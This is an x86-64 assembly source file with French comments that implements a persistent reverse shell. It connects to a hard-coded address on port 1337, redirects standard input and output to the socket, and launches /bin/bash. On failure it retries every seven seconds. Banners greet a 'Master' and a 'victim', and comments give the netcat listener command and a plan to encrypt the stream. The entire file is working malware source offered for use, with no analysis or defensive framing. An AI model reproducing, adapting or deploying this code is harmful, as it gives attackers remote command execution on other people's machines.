global _start
extern write
extern read
extern exit
extern nano_sleep
extern execve
extern dup2
;essayer de chiffrer le flux 
;essayer de mettre de fonctionnement au hasard 

;nasm -f elf64 main.s -o main.o
;nasm -f elf64 fun.s -o fun.o
;ld -o progAssembly main.o fun.o


;nc -lvp 1337 = ecoute sur le port 1337


section .data
    sockaddr:
        dw 2    
        dw 0x3905 ; 0x3905 = 0x05 0x39 = 1337p
        dd 0x0100007F
        dq 0

    msg:
        conn_test_msg db ">> Connecting to machine....", 0x0A
        conn_test_msg_len equ $ - conn_test_msg

        conn_success_msg db ">> Connected!", 0x0A
        conn_success_msg_len equ $ - conn_success_msg

        sock_init_msg db ">> Socket initialisation....", 0x0A
        sock_init_msg_len equ $ - sock_init_msg

        socket_err_msg db ">> /!\Waiting for socket/!\", 0x0A
        socket_err_msg_len equ $ - socket_err_msg

        dup2_err_msg db ">> /!\failed bind socket/!\", 0x0A
        dup2_err_msg_len equ $ - dup2_err_msg

        lstn_err_msg db "failed listen socket", 0x0A
        lstn_err_msg_len equ $ - lstn_err_msg

        accept_msg db"attack connected", 0x0A
        accept_msg_len equ $ - accept_msg

        create_shll_err_msg db "failed to create shell", 0x0A
        create_shll_msg_err_len equ $ - create_shll_err_msg

        create_shll_msg db ">> Shell successful", 0x0A
        create_shll_msg_len equ $ - create_shll_msg  

        shll_success_msg db ">> Shell created ! ", 0x0A
        shll_success_msg_len equ $ - shll_success_msg


        skt_err_msg db ">> /!\Socket creation failed/!\", 0x0A
        skt_err_msg_len equ $ - skt_err_msg

        welcome_master db 0x1B, "[1;35m" ; ESC[1;36m = bold cyan
        db "********************************************************", 0x0A
        db "*                                                      *", 0x0A
        db "*                   Welcome Master!                    *", 0x0A
        db "*                                                      *", 0x0A
        db "********************************************************", 0x0A
        db 0x1B, "[0m", 0x0A ; ESC[0m = reset attributes, Newline
        welcome_master_len equ $ - welcome_master
        

        welcome_victim db 0x1B, "[1;35m" ; ESC[1;36m = bold cyan
        db "--------------------------------------------------------", 0x0A
        db "|                                                      |", 0x0A
        db "|                Welcome to the shell                  |", 0x0A
        db "|                                                      |", 0x0A
        db "--------------------------------------------------------", 0x0A
        db 0x1B, "[0m", 0x0A ; ESC[0m = reset attributes, Newline
        welcome_victim_len equ $ - welcome_victim

        

    timespec:
        dq 7 ;rewind toute les 7 sec
        dq 0         
    
    shell:
        db "/bin/bash", 0
    argv dq shell, 0
    prompt_ps1 db "PS1=>> ", 0 ;personnaliser le prompt
    env dq prompt_ps1, 0 ;liste des variables d'environnement


section .bss
    sockfd resq 1
    welcome_displayed resb 1 ; pour éviter l'affichage multiple du message de bienvenue

section .text

_start:
.connection: 

    mov al, [welcome_displayed] ; Charger la valeur du drapeau
    cmp al, 1                   ; Comparer avec 1 (déjà affiché)
    je .skip_welcome  
     ; --- Affichage du message de bienvenue sur le shell distant ---
    ; Ceci est écrit sur le socket (maintenant stdout) avant l'execve.
    mov rdi, 1                  ; Descripteur de fichier 1 (stdout)
    lea rsi, [rel welcome_master] ; Pointeur vers le message de bienvenue
    mov rdx, welcome_master_len ; Longueur du message
    call write  
    
    mov byte[welcome_displayed], 1                ; Écrit le message de bienvenue

    .skip_welcome:
    ;initialisation du socket msg
    mov rdi, 2
    mov rsi, sock_init_msg
    mov rdx, sock_init_msg_len
    call write 

    ;socket creation via AF_INET SOCK STRAM 0
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    test rax, rax
    js .skt_err_msg ;si erreur alors sleep
    mov [sockfd], rax ;stock socket fd


    ;tentative de connection au serveur
    mov rdi, rax ;lit le fd du socket
    lea rsi, [rel sockaddr] ;adresse du serveur
    mov rdx, 16 ;taille de la structure sockaddr
    mov rax, 42 ;syscall numb
    syscall
    test rax, rax
    js .connect_err ;si erreur alors sleep

    ; msg de test connexion
    mov rdi, 2
    mov rsi, conn_test_msg
    mov rdx, conn_test_msg_len
    call write

    ;msg de succes de connection
    mov rdi, 2
    mov rsi, conn_success_msg
    mov rdx, conn_success_msg_len
    call write

    ;msg de creation shell
    mov rdi, 2
    mov rsi, create_shll_msg
    mov rdx, create_shll_msg_len
    call write

    mov rsi, 0 ;initialisation du compteur de redirection
    
.redirection:
    mov rdi, [sockfd]
    call dup2 ; duplication du fd
    test rax, rax
    js .bind_err ;si erreur alors sleep
    inc rsi
    cmp rsi, 3
    jne .redirection ;si erreur redirection

     ; --- Affichage du message de bienvenue sur le shell distant ---
    ; Ceci est écrit sur le socket (maintenant stdout) avant l'execve.
    mov rdi, 1                  ; Descripteur de fichier 1 (stdout)
    lea rsi, [rel welcome_victim] ; Pointeur vers le message de bienvenue
    mov rdx, welcome_victim_len ; Longueur du message
    call write                  ; Écrit le message de bienvenue

 

    ;creation reverse shell
    lea rdi, [rel shell] ;chemin du shell
    lea rsi, [rel argv] ;arguments du shell
    lea rdx, [rel env] ;variables d'environnement
    call execve
    jmp .error_shell_err
    ;si erreur alors sleep


.error_shell_err: ;gestion erreur 
    mov rdi, 2
    mov rsi, create_shll_err_msg
    mov rdx, create_shll_msg_err_len
    call write
    jmp .sleep

.connect_err:
    mov rdi, 2
    mov rsi, socket_err_msg
    mov rdx, socket_err_msg_len
    call write  
    jmp .sleep

.bind_err:
    mov rdi, 2
    mov rsi, dup2_err_msg
    mov rdx, dup2_err_msg_len
    call write  
    jmp .sleep
    
.skt_err_msg:
    mov rdi, 2
    mov rsi, skt_err_msg
    mov rdx, skt_err_msg_len
    call write  
    jmp .sleep


.sleep:

    lea rdi, [rel timespec]
    mov rsi, 0
    mov rax, 35
    syscall
    jmp _start ;si erreur alors recommence


.exit: 
    mov rdi, 0
    call exit
    